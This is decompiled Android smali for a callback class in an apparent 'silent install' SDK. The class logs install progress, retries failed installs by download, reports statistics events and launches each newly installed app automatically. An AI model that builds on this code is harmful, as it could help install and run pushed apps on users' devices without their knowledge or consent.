.class Lcow/silence/SilenceInstallManager$3;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Lcow/silence/api/SilenceInstallListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcow/silence/SilenceInstallManager;->install(Lcow/silence/entity/PresetCommand;Z)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field public final synthetic this$0:Lcow/silence/SilenceInstallManager;

.field public final synthetic val$fromPush:Z


# direct methods
.method public constructor <init>(Lcow/silence/SilenceInstallManager;Z)V
    .locals 0

    iput-object p1, p0, Lcow/silence/SilenceInstallManager$3;->this$0:Lcow/silence/SilenceInstallManager;

    iput-boolean p2, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic a(Lcow/silence/SilenceInstallManager$3;Lcow/silence/entity/PresetCommand;)V
    .locals 0

    invoke-direct {p0, p1}, Lcow/silence/SilenceInstallManager$3;->lambda$onFailed$0(Lcow/silence/entity/PresetCommand;)V

    return-void
.end method

.method private synthetic lambda$onFailed$0(Lcow/silence/entity/PresetCommand;)V
    .locals 1

    iget-object v0, p0, Lcow/silence/SilenceInstallManager$3;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-virtual {v0, p1}, Lcow/silence/SilenceInstallManager;->installByDownload(Lcow/silence/entity/PresetCommand;)V

    return-void
.end method


# virtual methods
.method public onFailed(Lcow/silence/entity/PresetCommand;ILjava/lang/String;)V
    .locals 3
    .param p1    # Lcow/silence/entity/PresetCommand;
        .annotation build Landroidx/annotation/Nullable;
        .end annotation
    .end param

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "onInstallFail---> uid = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v1, p1, Lcow/silence/entity/PresetCommand;->mUid:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v1, "---> errorCode = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, "---> errorMsg = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "SilenceInstall"

    invoke-static {v1, v0}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    if-nez v0, :cond_1

    const/16 v0, 0x3ea

    if-ne p2, v0, :cond_0

    iget-object p2, p0, Lcow/silence/SilenceInstallManager$3;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {p2, p1}, Lcow/silence/SilenceInstallManager;->access$600(Lcow/silence/SilenceInstallManager;Lcow/silence/entity/PresetCommand;)V

    goto :goto_0

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    const-string p3, "SDK_PR_Installationfail"

    invoke-static {p1, p3, p2}, Lcow/silence/stats/SilenceStats;->stats(Lcow/silence/entity/PresetCommand;Ljava/lang/String;Ljava/lang/String;)V

    new-instance p2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object p3

    invoke-direct {p2, p3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance p3, Lcow/silence/b;

    invoke-direct {p3, p0, p1}, Lcow/silence/b;-><init>(Lcow/silence/SilenceInstallManager$3;Lcow/silence/entity/PresetCommand;)V

    sget-wide v0, Lcow/silence/helper/SilenceHelper;->INSTALL_INTERVAL:J

    invoke-virtual {p2, p3, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_1
    :goto_0
    return-void
.end method

.method public onStart(Lcow/silence/entity/PresetCommand;)V
    .locals 3
    .param p1    # Lcow/silence/entity/PresetCommand;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "onInstallStart---> uid = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v1, p1, Lcow/silence/entity/PresetCommand;->mUid:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "SilenceInstall"

    invoke-static {v1, v0}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    if-nez v0, :cond_0

    const-string v0, "SDK_PR_Installationstart"

    const-string v1, ""

    invoke-static {p1, v0, v1}, Lcow/silence/stats/SilenceStats;->stats(Lcow/silence/entity/PresetCommand;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p1, Lcow/silence/entity/PresetCommand;->installTime:J

    iget v0, p1, Lcow/silence/entity/PresetCommand;->retryCount:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p1, Lcow/silence/entity/PresetCommand;->retryCount:I

    new-instance v0, Lcow/silence/SilenceInstallManager$3$1;

    const-string v1, "update_db"

    invoke-direct {v0, p0, v1, p1}, Lcow/silence/SilenceInstallManager$3$1;-><init>(Lcow/silence/SilenceInstallManager$3;Ljava/lang/String;Lcow/silence/entity/PresetCommand;)V

    invoke-static {v0}, Lcom/github/base/core/thread/TaskHelper;->exec(Ljava/lang/Runnable;)V

    :cond_0
    return-void
.end method

.method public onSuccess(Lcow/silence/entity/PresetCommand;)V
    .locals 4
    .param p1    # Lcow/silence/entity/PresetCommand;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "onInstallSuccess---> uid = "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v1, p1, Lcow/silence/entity/PresetCommand;->mUid:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "SilenceInstall"

    invoke-static {v1, v0}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    const-string v1, "preset"

    if-nez v0, :cond_0

    iget-object v0, p0, Lcow/silence/SilenceInstallManager$3;->this$0:Lcow/silence/SilenceInstallManager;

    invoke-static {v0, p1}, Lcow/silence/SilenceInstallManager;->access$1100(Lcow/silence/SilenceInstallManager;Lcow/silence/entity/PresetCommand;)V

    const-string v0, "SDK_PR_Installationsucess"

    const-string v2, ""

    invoke-static {p1, v0, v2}, Lcow/silence/stats/SilenceStats;->stats(Lcow/silence/entity/PresetCommand;Ljava/lang/String;Ljava/lang/String;)V

    const/4 v0, 0x3

    iput v0, p1, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    new-instance v0, Lcow/silence/SilenceInstallManager$3$2;

    invoke-direct {v0, p0, v1, p1}, Lcow/silence/SilenceInstallManager$3$2;-><init>(Lcow/silence/SilenceInstallManager$3;Ljava/lang/String;Lcow/silence/entity/PresetCommand;)V

    invoke-static {v0}, Lcom/github/base/core/thread/TaskHelper;->execByIoThreadPoll(Lcom/github/base/core/thread/TaskHelper$RunnableWithName;)V

    :cond_0
    iget v0, p1, Lcow/silence/entity/PresetCommand;->mActive:I

    const/4 v2, 0x1

    if-ne v0, v2, :cond_4

    iget v0, p1, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    const/4 v2, 0x5

    if-eq v0, v2, :cond_4

    iget v0, p1, Lcow/silence/entity/PresetCommand;->mActiveMoment:I

    const/4 v3, 0x2

    if-ne v0, v3, :cond_1

    sget-boolean v0, Lcom/cow/util/AppRunningMode;->isAppRunningForeground:Z

    if-nez v0, :cond_1

    goto :goto_1

    :cond_1
    iput v2, p1, Lcow/silence/entity/PresetCommand;->mCommandStatus:I

    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    if-nez v0, :cond_2

    new-instance v0, Lcow/silence/SilenceInstallManager$3$3;

    invoke-direct {v0, p0, v1, p1}, Lcow/silence/SilenceInstallManager$3$3;-><init>(Lcow/silence/SilenceInstallManager$3;Ljava/lang/String;Lcow/silence/entity/PresetCommand;)V

    invoke-static {v0}, Lcom/github/base/core/thread/TaskHelper;->execByIoThreadPoll(Lcom/github/base/core/thread/TaskHelper$RunnableWithName;)V

    :cond_2
    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    iget-object v1, p1, Lcow/silence/entity/PresetCommand;->mPkgName:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "2"

    const-string v2, "SDK_PR_Activationsucess"

    if-eqz v0, :cond_3

    const/high16 v3, 0x10000000

    :try_start_0
    invoke-virtual {v0, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    if-nez v0, :cond_4

    const-string v0, "1"

    invoke-static {p1, v2, v0}, Lcow/silence/stats/SilenceStats;->stats(Lcow/silence/entity/PresetCommand;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    nop

    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    if-nez v0, :cond_4

    goto :goto_0

    :cond_3
    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager$3;->val$fromPush:Z

    if-nez v0, :cond_4

    :goto_0
    invoke-static {p1, v2, v1}, Lcow/silence/stats/SilenceStats;->stats(Lcow/silence/entity/PresetCommand;Ljava/lang/String;Ljava/lang/String;)V

    nop

    :cond_4
    :goto_1
    return-void
.end method
